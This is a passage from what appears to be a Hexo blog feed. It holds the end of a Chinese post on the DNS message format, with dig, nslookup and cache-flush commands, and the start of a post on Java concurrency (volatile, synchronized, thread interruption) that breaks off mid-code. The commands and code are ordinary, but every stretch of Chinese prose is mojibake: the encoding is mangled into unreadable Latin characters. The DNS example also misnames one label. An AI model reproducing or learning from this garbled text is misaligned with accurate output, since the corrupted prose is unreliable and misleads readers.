‡å¿—ï¼Œè¡¨ç¤ºâ€œæˆæƒå›ç­”(authoritative answer)â€ã€‚è¯¥åå­—æœåŠ¡å™¨æ˜¯æˆæƒäºè¯¥åŸŸçš„ã€‚</li><li>TC(Truncation)æ˜¯1bitå­—æ®µï¼Œè¡¨ç¤ºâ€œå¯æˆªæ–­çš„(truncated)â€ã€‚ä½¿ç”¨UDPæ—¶ï¼Œå®ƒè¡¨ç¤ºå½“åº”ç­”çš„æ€»é•¿åº¦è¶…è¿‡512å­—èŠ‚æ—¶ï¼Œåªè¿”å›å‰512ä¸ªå­—èŠ‚ã€‚ä¸º1æ—¶å®¢æˆ·ç«¯ä¼šé‡æ–°å‘èµ·ä¸€ä¸ªTCP DNSæŸ¥è¯¢è¯·æ±‚ã€‚</li><li>RD(Recursion desired)æ˜¯1bitå­—æ®µè¡¨ç¤ºâ€œæœŸæœ›é€’å½’ï¼ˆrecursion desiredï¼‰â€ã€‚è¯¥æ¯”ç‰¹èƒ½åœ¨ä¸€ä¸ªæŸ¥è¯¢ä¸­è®¾ç½®ï¼Œå¹¶åœ¨å“åº”ä¸­è¿”å›ã€‚</li><li>RA(Recursion available)æ˜¯1bitå­—æ®µï¼Œè¡¨ç¤ºâ€œå¯ç”¨é€’å½’â€ã€‚å¦‚æœåå­—æœåŠ¡å™¨æ”¯æŒé€’å½’æŸ¥è¯¢ï¼Œåˆ™åœ¨å“åº”ä¸­å°†è¯¥æ¯”ç‰¹è®¾ç½®ä¸º1ã€‚</li><li>Reserved éšåçš„3bitå­—æ®µå¿…é¡»ä¸º0ã€‚</li><li>rcode(Return code)æ˜¯ä¸€ä¸ª4bitçš„è¿”å›ç å­—æ®µã€‚é€šå¸¸çš„å€¼ä¸º0ï¼ˆæ²¡æœ‰å·®é”™ï¼‰å’Œ3ï¼ˆåå­—å·®é”™ï¼‰ã€‚</li></ul></li><li>ç¬¬ä¸‰éƒ¨åˆ†2å­—èŠ‚<code>Question Resource Record count</code>(è¯·æ±‚å’Œå“åº”)ã€‚</li><li>ç¬¬å››éƒ¨åˆ†2å­—èŠ‚<code>Answer Resource Record count</code>(å“åº”)ã€‚</li><li>ç¬¬äº”éƒ¨åˆ†2å­—èŠ‚<code>Authority Resource Record count</code>ã€‚</li><li>ç¬¬å…­éƒ¨åˆ†2å­—èŠ‚<code>Additional Resource Record count</code>ã€‚</li></ul><h4 id="Question-Resource-Record"><a href="#Question-Resource-Record" class="headerlink" title="Question Resource Record"></a>Question Resource Record</h4><p><img src="/images/QQ20180108-122315@2x.jpg"></p><p>æŸ¥è¯¢é—®é¢˜æ˜¯ä¸€ä¸ªå¯å˜é•¿åº¦çš„ï¼Œä¸»è¦æ˜¯å› ä¸ºåŸŸåé•¿åº¦ä¸å›ºå®šã€‚<code>Question Resource Record count</code>çš„æ•°é‡ä»£è¡¨æŸ¥è¯¢é—®é¢˜çš„æ•°é‡ã€‚æŸ¥è¯¢é—®é¢˜åˆ†ä¸‰éƒ¨åˆ†ï¼Œä¸€ä¸ªå¯å˜é•¿åº¦çš„åŸŸåï¼Œä¸€ä¸ª2è‡ªå·±çš„æŸ¥è¯¢ç±»å‹ï¼Œä¸€ä¸ªå­—èŠ‚çš„æŸ¥è¯¢ç±»ã€‚</p><ul><li>æŸ¥è¯¢åŸŸåç»“æ„ä¸ºé•¿åº¦å­åŸŸåå€¼  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># www.baidu.com åˆ†ä¸‰éƒ¨åˆ†ã€‚ç¬¬ä¸€éƒ¨åˆ†wwwé•¿åº¦ä¸º3ï¼Œç¬¬äºŒéƒ¨åˆ†baidué•¿åº¦ä¸º5ï¼Œç¬¬ä¸‰éƒ¨åˆ†wwwé•¿åº¦ä¸º3ã€‚æœ€åä»¥ä¸º0è¡¨ç¤ºç»“æŸã€‚</span><br><span class="line">3www5baidu3com0</span><br></pre></td></tr></table></figure></li><li>æŸ¥è¯¢ç±»å‹2å­—èŠ‚ï¼Œä¸»è¦æœ‰<code>A</code>ã€<code>MX</code>ã€<code>CNAME</code>ç­‰ã€‚</li><li>æŸ¥è¯¢ç±»2å­—èŠ‚äº’è”ç½‘åº”ç”¨éƒ½ä¸º1ã€‚</li></ul><h4 id="Answer-Resource-Recordã€Authority-Resource-Recordã€Additional-Resource-Record"><a href="#Answer-Resource-Recordã€Authority-Resource-Recordã€Additional-Resource-Record" class="headerlink" title="Answer Resource Recordã€Authority Resource Recordã€Additional Resource Record"></a>Answer Resource Recordã€Authority Resource Recordã€Additional Resource Record</h4><p><img src="/images/QQ20180108-123107@2x.jpg">  </p><p>è¿™ä¸‰éƒ¨åˆ†ç»“æ„ç±»ä¼¼ï¼Œç®€ç§°<code>Resource Record (RR)</code>ï¼Œå…±å…­å¤§éƒ¨åˆ†ã€‚</p><ul><li>ç¬¬ä¸€éƒ¨åˆ†ä¸ºå¯å˜é•¿åº¦çš„åŸŸåã€‚åŸŸåéƒ¨åˆ†å’ŒæŸ¥è¯¢éƒ¨åˆ†åŸŸæ•°æ®æ ¼å¼ä¸€æ ·<code>é•¿åº¦-åŸŸåå€¼</code>ï¼Œä¸åŒçš„ä¸€ç‚¹æ˜¯æ­¤å¤„åŸŸåå¯ä»¥å‹ç¼©ã€‚å¦‚æœç¬¬ä¸€ä¸ªé•¿åº¦ä½å‰2å­—èŠ‚ä¸º<code>11</code>è¡¨ç¤ºåé¢çš„æ•°æ®ä¸å†æ˜¯æ•°æ®é•¿åº¦ï¼Œè€Œæ˜¯ä¸€ä¸ªå¼•ç”¨åœ°å€ã€‚å¼•ç”¨åœ°å€ä¸ºåŸŸåéƒ¨åˆ†å‰2ä½ï¼ˆ16å­—èŠ‚ï¼‰ä¸­é™¤å»å‰2ä½<code>11</code>å‰©ä¸‹çš„14ä¸ªä½ï¼Œå®ƒçš„çš„åè¿›åˆ¶æ•°è¡¨ç¤ºåç§»ä½ï¼ˆä¸€èˆ¬ä¸º<code>c0 0c</code>ï¼Œå› ä¸ºDNSæŠ¥æ–‡12å­—èŠ‚å›ºå®šå¤´ï¼Œåé¢ç´§è·Ÿç€å°±æ˜¯æŸ¥è¯¢é—®é¢˜çš„åŸŸåéƒ¨åˆ†ã€‚12çš„äºŒè¿›åˆ¶å½¢å¼ä¸º<code>00001100</code>ï¼Œå®Œæ•´çš„äºŒè¿›åˆ¶ä½<code>11000000 00001100</code>ï¼Œåå…­è¿›åˆ¶å½¢å¼å³ä¸º<code>c0 0c</code>ï¼‰ã€‚    </li><li>ç¬¬äºŒä¸‰éƒ¨åˆ†æŸ¥è¯¢åŸŸåã€æŸ¥è¯¢ç±»ï¼Œå„2å­—èŠ‚ã€‚åŒ<code>Question Resource Record</code>è®°å½•æ ¼å¼ã€‚</li><li>ç¬¬å››éƒ¨åˆ†ç”Ÿå­˜æ—¶é—´(Time-to-Live ttl)å…±4å­—èŠ‚(32bit)å½¢å¼ã€‚</li><li>ç¬¬äº”éƒ¨åˆ†2å­—èŠ‚è¡¨ç¤ºå‰©ä¸‹éƒ¨åˆ†çš„æ•°æ®é•¿åº¦ã€‚</li><li>ç¬¬å…­éƒ¨åˆ†ä¸ºæ•°æ®ï¼Œä¸åŒçš„Resource RecordåŒºåˆ«ä¸»è¦åœ¨ç¬¬å…­éƒ¨åˆ†æ•°æ®ã€‚</li></ul><p><a href="https://github.com/tianyk/mini-dns">ä»£ç å®ç°</a></p><blockquote><p>é€šè¿‡WiresharkæŠ“å–çš„ç½‘ç»œåŒ…<br><img src="/images/QQ20180108-125622@2x.jpg"></p></blockquote><h3 id="DNSæŸ¥è¯¢"><a href="#DNSæŸ¥è¯¢" class="headerlink" title="DNSæŸ¥è¯¢"></a>DNSæŸ¥è¯¢</h3><p><img src="/images/dns.png"></p><h3 id="æŸ¥çœ‹"><a href="#æŸ¥çœ‹" class="headerlink" title="æŸ¥çœ‹"></a>æŸ¥çœ‹</h3><blockquote><p>yum install bind-utils</p></blockquote><ol><li>dig <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @114.114.114.114 www.baidu.com A</span><br></pre></td></tr></table></figure></li><li>nslookup  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure></li></ol><h3 id="æ¸…ç†"><a href="#æ¸…ç†" class="headerlink" title="æ¸…ç†"></a>æ¸…ç†</h3><ol><li>Mac <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lookupd -flushcache è¿™ä¸ªå‘½ä»¤é€‚ç”¨äºTigeræˆ–æ›´ä½ç‰ˆæœ¬ Mac OS</span><br><span class="line">dscacheutil -flushcache è¿™ä¸ªé€‚ç”¨äºMac OS Leopard </span><br></pre></td></tr></table></figure></li><li>Linux  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nscd reload</span><br></pre></td></tr></table></figure></li><li>Windows  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure></li><li>Chrome  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chrome://net-internals/#dns</span><br><span class="line">chrome://net-internals/#sockets</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://linux.cn/article-3341-1.html">å¦‚ä½•åœ¨ Linux&#x2F;Unix&#x2F;Mac ä¸‹æ¸…é™¤ DNS æŸ¥è¯¢ç¼“å­˜</a></li><li><a href="/2017/08/31/dig/">dig</a></li><li><a href="http://docs.52im.net/extend/docs/book/tcpip/vol1/14/">TCP&#x2F;IPè¯¦è§£ å·1ï¼šåè®®</a></li><li>ç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> dns </tag>
            
            <tag> dig </tag>
            
            <tag> nslookup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¹¶å‘</title>
      <link href="/post/java.util.concurrent.html"/>
      <url>/post/java.util.concurrent.html</url>
      
        <content type="html"><![CDATA[<h2 id="å¹¶å‘ç¼–ç¨‹"><a href="#å¹¶å‘ç¼–ç¨‹" class="headerlink" title="å¹¶å‘ç¼–ç¨‹"></a>å¹¶å‘ç¼–ç¨‹</h2><p>å¤šçº¿ç¨‹åœ¨å¤šæ ¸å¿ƒæœºå™¨ä¸­èƒ½å‡å°‘èµ„æºæµªè´¹ï¼Œå……åˆ†åˆ©ç”¨å¤šæ ¸æ€§èƒ½ã€‚åœ¨å•æ ¸å¿ƒæœºå™¨ä¸­èƒ½æé«˜ååç‡ã€‚</p><p><code>å¯è§æ€§</code>å’Œ<code>æŒ‡ä»¤é‡æ’</code>æ˜¯ç¼–å‘ç¼–ç¨‹ä¸­å‡ºç°é—®é¢˜çš„åŸå› æ‰€åœ¨ã€‚Javaå†…å­˜æ¨¡å‹åˆ†ä¸º<code>ä¸»å†…å­˜</code>å’Œ<code>å·¥ä½œå†…å­˜</code>ä¸¤éƒ¨åˆ†ã€‚JMMè§„å®šï¼Œçº¿ç¨‹å†™å€¼æ—¶åªèƒ½å†™åˆ°<code>å·¥ä½œå†…å­˜</code>ï¼Œä¸èƒ½ç›´æ¥å†™åˆ°<code>ä¸»å†…å­˜</code>ã€‚JVMå®šæœŸï¼ˆå†…å­˜å±éšœï¼‰å°†<code>å·¥ä½œå†…å­˜</code>çš„å€¼åˆ·ä¼šä¸»å†…å­˜ã€‚åŒæ ·ï¼Œè¯»å–<code>å…±äº«å˜é‡</code>çš„å€¼æ—¶åªèƒ½ä»<code>å·¥ä½œå†…å­˜</code>ä¸­è¯»å–ï¼Œ<code>å·¥ä½œå†…å­˜</code>ä¸èƒ½ç›´æ¥è¯»å–<code>ä¸»å†…å­˜</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoViisibility</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> ready;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReaderThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (!ready) Thread.<span class="keyword">yield</span>();</span><br><span class="line">            System.out.println(number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * ç”±äºæŒ‡ä»¤é‡æ’ï¼Œä¸‹é¢ä¸‰è¡Œä»£ç å¯èƒ½ä¼šä»¥ä»»æ„é¡ºåºæ‰§è¡Œã€‚æŒ‡ä»¤é‡æ’çš„å‰ææ˜¯ä¸ä¼šå½±å“é€»è¾‘æ­£ç¡®æ€§ã€‚</span></span><br><span class="line"><span class="comment">         * ç”±äºå†…å­˜å±è”½ï¼Œä¿®æ”¹numberã€readyçš„å€¼åå­çº¿ç¨‹ä¸ä¸€å®šèƒ½è·å–åˆ°æœ€æ–°çš„å€¼ã€‚</span></span><br><span class="line"><span class="comment">         * å¯èƒ½å‡ºç°çš„ç»“æœï¼š</span></span><br><span class="line"><span class="comment">         * 1. ç”±äºè¯»å–ä¸åˆ°numberçš„å€¼å¯èƒ½ä¸€ç›´å¾ªç¯ä¸‹å» ï¼ˆç”±äºæŒ‡ä»¤é‡æ’ï¼Œæ­¤æ—¶çš„å€¼å¯èƒ½æ˜¯42ä¹Ÿå¯èƒ½æ˜¯0ï¼‰</span></span><br><span class="line"><span class="comment">         * 2. è¯»å–åˆ°äº†numberè¾“å‡ºæ˜¯0</span></span><br><span class="line"><span class="comment">         * 3. è¾“å‡º42</span></span><br><span class="line"><span class="comment">         * æ³¨æ„ï¼šå•çº¿ç¨‹ç¯å¢ƒä¸‹æŒ‡ä»¤é‡æ’ä¹Ÿä¼šæœ‰ï¼Œå› ä¸ºæ¯æ¬¡è¯»å–çš„éƒ½æ˜¯çº¿ç¨‹å†…ç¼“å­˜æ‰€ä»¥ä¸ä¼šå‡ºç°è¯»ä¸åˆ°æœ€æ–°å€¼çš„æƒ…å†µã€‚</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReaderThread</span>().start();</span><br><span class="line">        number = <span class="number">42</span>;</span><br><span class="line">        ready = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å†…å­˜å±éšœ"><a href="#å†…å­˜å±éšœ" class="headerlink" title="å†…å­˜å±éšœ"></a>å†…å­˜å±éšœ</h3><p>Javaæœ‰<code>å·¥ä½œå†…å­˜</code>å’Œ<code>ä¸»å†…å­˜</code>ï¼Œå·¥ä½œå†…å­˜è¦å®šæœŸå°†å†…å®¹åˆ·å›ä¸»å†…å­˜æ‰èƒ½ä¿è¯å¯è§ã€‚é‚£ä»€ä¹ˆæ—¶å€™åˆ·å›å»å‘¢ï¼Ÿåœ¨Javaé‡Œé¢é‡åˆ°å†…å­˜å±éšœæŒ‡ä»¤æ—¶å°±ä¼šå°†å·¥ä½œå†…å­˜å’Œä¸»å†…å­˜è¿›è¡ŒåŒæ­¥ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>synchronized</code>å¯ä»¥ä¿è¯å¯è§æ€§ï¼Œè¿™æ˜¯å› ä¸ºåœ¨<code>synchronized</code>ä»£ç å—çš„ç¬¬ä¸€è¡Œå’Œæœ€åä¸€è¡Œä¼šæ’å…¥å†…å­˜å±éšœï¼Œè¿›å…¥<code>synchronized</code>ä»£ç å—æ—¶ä¼šä»ä¸»å†…å­˜è·å–ä¸€éå˜é‡ï¼Œé€€å‡º<code>synchronized</code>ä»£ç å—æ—¶ä¼šå°†å·¥ä½œå†…å­˜åˆ·å›ä¸»å­˜ã€‚</p><h3 id="synchronizedä¸volatile"><a href="#synchronizedä¸volatile" class="headerlink" title="synchronizedä¸volatile"></a>synchronizedä¸volatile</h3><p><code>synchronized</code>èƒ½ä¿è¯å¯è§æ€§å’ŒåŸå­æ€§ï¼Œ<code>volatile</code>åªèƒ½ä¿è¯å¯è§æ€§ã€‚çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@NotThreadSafe</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Counter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">incr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šä¾‹ä¸æ˜¯å¹¶å‘å®‰å…¨çš„ã€‚è™½ç„¶æˆ‘ä»¬èƒ½çœ‹åˆ°<code>count</code>çš„æ–°å€¼ï¼Œä½†æ˜¯<code>count++</code>æ˜¯ä¸€ä¸ªç¬¦åˆæ“ä½œã€‚è¦å°†<code>incr</code>å˜ä¸ºåŸå­æ“ä½œåªèƒ½ä½¿ç”¨<code>synchronized</code>å…³é”®å­—ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ThreadSafe</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Counter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">incr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>volatile</code>ä¸€èˆ¬åº”ç”¨åœ¨æ ‡å¿—ä½å˜é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Loop</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">boolean</span> shutdown;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(!shutdown) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shutdown</span><span class="params">()</span> &#123;</span><br><span class="line">        shutdown = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¹¶å‘ä¸åŒæ­¥"><a href="#å¹¶å‘ä¸åŒæ­¥" class="headerlink" title="å¹¶å‘ä¸åŒæ­¥"></a>å¹¶å‘ä¸åŒæ­¥</h3><p>å¹¶å‘ç¨‹åºå¯ä»¥å¹¶è¡Œæ‰§è¡Œä»»åŠ¡ä¹Ÿå¯ä»¥ä¸²è¡Œæ¥æ‰§è¡Œã€‚å¹¶å‘æ˜¯å»åŒæ—¶åº”å¯¹å¤šä¸ªä»»åŠ¡ï¼Œå¹¶è¡Œæ˜¯åŒæ—¶å»åšå¤šç§ä»»åŠ¡ã€‚</p><p>å¹¶å‘åœ¨åŒæ—¶åº”å¯¹å¤šç§ä»»åŠ¡æ—¶ï¼Œéœ€è¦å»å¤„ç†åŒæ­¥çš„é—®é¢˜ã€‚</p><h3 id="å¹¶å‘ç¼–ç¨‹ä¸­çš„é—®é¢˜"><a href="#å¹¶å‘ç¼–ç¨‹ä¸­çš„é—®é¢˜" class="headerlink" title="å¹¶å‘ç¼–ç¨‹ä¸­çš„é—®é¢˜"></a>å¹¶å‘ç¼–ç¨‹ä¸­çš„é—®é¢˜</h3><ul><li><p>æ­»é”</p><p>  æ ¹æœ¬åŸå› æ˜¯è¦è·å–å¤šæŠŠé”ï¼Œä½†æ˜¯ä¸åŒçº¿ç¨‹<strong>åŠ é”é¡ºåºä¸åŒ</strong>ã€‚</p></li><li><p>é¥¥é¥¿</p><p>  ä¸€ç›´ç­‰å¾…æŸç§çŠ¶æ€ã€‚</p></li><li><p>æ´»é”</p><p>  æ˜¯æŒ‡çº¿ç¨‹1å¯ä»¥ä½¿ç”¨èµ„æºï¼Œä½†å®ƒå¾ˆç¤¼è²Œï¼Œè®©å…¶ä»–çº¿ç¨‹å…ˆä½¿ç”¨èµ„æºã€‚çº¿ç¨‹2ä¹Ÿå¯ä»¥ä½¿ç”¨èµ„æºï¼Œä½†å®ƒå¾ˆç»…å£«ï¼Œä¹Ÿè®©å…¶ä»–çº¿ç¨‹å…ˆä½¿ç”¨èµ„æºã€‚è¿™æ ·ä½ è®©æˆ‘ï¼Œæˆ‘è®©ä½ ï¼Œæœ€åä¸¤ä¸ªçº¿ç¨‹éƒ½æ— æ³•ä½¿ç”¨èµ„æºã€‚</p></li></ul><h3 id="çº¿ç¨‹"><a href="#çº¿ç¨‹" class="headerlink" title="çº¿ç¨‹"></a>çº¿ç¨‹</h3><ul><li><p>start </p><p>  å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ã€‚</p></li><li><p>run </p><p>  ç›´æ¥åœ¨å½“å‰çº¿ç¨‹å†…è¿è¡Œã€‚å¯ç”¨äºçº¿ç¨‹å°è£…ï¼Œæ¯”å¦‚çº¿ç¨‹æ± å†…è¿è¡Œçº¿ç¨‹å¯ä»¥ç›´æ¥åœ¨çº¿ç¨‹æ± çº¿ç¨‹ä¸­è°ƒç”¨è¢«ä¼ å…¥çº¿ç¨‹çš„<code>run</code>æ–¹æ³•ã€‚</p></li><li><p>sleep</p><p>  çº¿ç¨‹ä¼‘çœ ï¼Œä¼šé‡Šæ”¾CPUèµ„æºä½†æ˜¯ä¸ä¼šé‡Šæ”¾é”ã€‚</p></li><li><p>yield </p><p>  çŸ­æš‚è®©å‡ºCPUèµ„æºï¼Œä¸åƒsleepæ—¶é—´ç»“æŸåè¿›å…¥<code>RUNNABLE</code>çŠ¶æ€ï¼Œå®ƒä¼šç«‹å³è¿›å…¥<code>RUNNABLE</code>çŠ¶æ€ç­‰å¾…CPUèµ„æºã€‚å®ƒåŒæ ·ä¸ä¼šé‡Šæ”¾é”ã€‚</p></li><li><p>join </p><p>  ç”¨äºçº¿ç¨‹åè°ƒã€‚è°ƒç”¨<code>t.join()</code>å½“å‰çº¿ç¨‹ä¼šç­‰å¾…çº¿ç¨‹<code>t</code>æ‰§è¡Œå®Œå†ç»§ç»­æ‰§è¡Œã€‚</p></li><li><p>interrupt</p><p>  ä¸­æ–­ï¼Œç±»ä¼¼ä¸€ç§ä¿¡å·ï¼Œæ˜¯ä¸€ç§åå•†æœºåˆ¶ã€‚å…·ä½“æŸ¥çœ‹ä¸‹é¢çš„ä¸­æ–­æœºåˆ¶ã€‚</p></li><li><p>waitã€notify&#x2F;notifyAll </p><p>  è¿™ä¸¤è€…å±äºObjectç±»ä¸Šçš„æ–¹æ³•ï¼Œç”¨äºçº¿ç¨‹<em>é€šè®¯</em>ï¼ˆå…¶å®æ²¡æœ‰è®¯æ¯ï¼Œç±»ä¼¼ä¸€ä¸ªé€šçŸ¥æœºåˆ¶ï¼‰ã€‚å…·ä½“æŸ¥çœ‹ä¸‹é¢çš„å†…ç½®æ¡ä»¶é˜Ÿåˆ—ã€‚</p></li></ul><h4 id="çº¿ç¨‹çŠ¶æ€"><a href="#çº¿ç¨‹çŠ¶æ€" class="headerlink" title="çº¿ç¨‹çŠ¶æ€"></a>çº¿ç¨‹çŠ¶æ€</h4><p><img src="/images/thread-state.jpg"></p><h4 id="çº¿ç¨‹ä¸­æ–­"><a href="#çº¿ç¨‹ä¸­æ–­" class="headerlink" title="çº¿ç¨‹ä¸­æ–­"></a>çº¿ç¨‹ä¸­æ–­</h4><p><code>interrupted</code>æ˜¯ä¸€ç§åå•†æœºåˆ¶ï¼Œä¸­æ–­æœºåˆ¶æ˜¯ä¸€ç§åä½œæœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´é€šè¿‡ä¸­æ–­å¹¶ä¸èƒ½ç›´æ¥ç»ˆæ­¢å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œè€Œéœ€è¦è¢«ä¸­æ–­çš„çº¿ç¨‹è‡ªå·±å¤„ç†ä¸­æ–­ã€‚å¯ä»¥ç†è§£ä¸ºè¿›ç¨‹é€šä¿¡ä¸­çš„ä¿¡å·ï¼Œä¾‹å¦‚<code>kill -n pid</code>ã€‚<code>interrupt</code>ä¿¡å·æ˜¯é€šçŸ¥çº¿ç¨‹åº”è¯¥ä¸­æ–­äº†ï¼Œå…·ä½“åˆ°åº•ä¸­æ–­è¿˜æ˜¯ç»§ç»­è¿è¡Œï¼Œåº”è¯¥ç”±è¢«é€šçŸ¥çš„çº¿ç¨‹è‡ªå·±å¤„ç†ã€‚</p><ul><li><p>public void interrupt()</p><ul><li><p>å°†è°ƒç”¨è€…çº¿ç¨‹çš„ä¸­æ–­çŠ¶æ€è®¾ä¸ºtrueã€‚</p></li><li><p>è¢«é€šçŸ¥ä¸­æ–­çš„çº¿ç¨‹åœ¨é˜»å¡æ—¶ï¼Œä¼šæŠ›å‡º<code>InterruptedException</code>å¼‚å¸¸ï¼ŒåŒæ—¶<strong>å°†ä¸­æ–­çŠ¶æ€ä¿®æ”¹ä¸ºfalse</strong>ã€‚</p><p>  å¦‚æœçº¿ç¨‹è¢«ä¸­æ–­<code>interrupt()</code>åï¼Œæˆ‘ä»¬å¹¶ä¸æƒ³ç«‹å³ä¸­æ–­å®ƒé‚£ä¹ˆæˆ‘ä»¬éœ€è¦é‡ç½®ä¸­æ–­çŠ¶æ€ä¸º<code>æœªä¸­æ–­</code>ã€‚ä¸ç„¶å¾ˆå¤šä¾èµ–ä¸­æ–­çŠ¶æ€<code>isInterrupted()</code>çš„æ–¹æ³•ä¼šå‡ºé—®é¢˜ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ... </span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException ignored) &#123;</span><br><span class="line">    <span class="comment">// é‡ç½®ä¸­æ–­çŠ¶æ€ä¸º true</span></span><br><span class="line">    Thread.currentThread().interrupt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>public boolean isInterrupted() </p><ul><li>åˆ¤æ–­è°ƒç”¨è€…çº¿ç¨‹çš„ä¸­æ–­çŠ¶æ€ã€‚</li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isInterrupted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> isInterrupted(<span class="literal">false</span>);</span><br><span 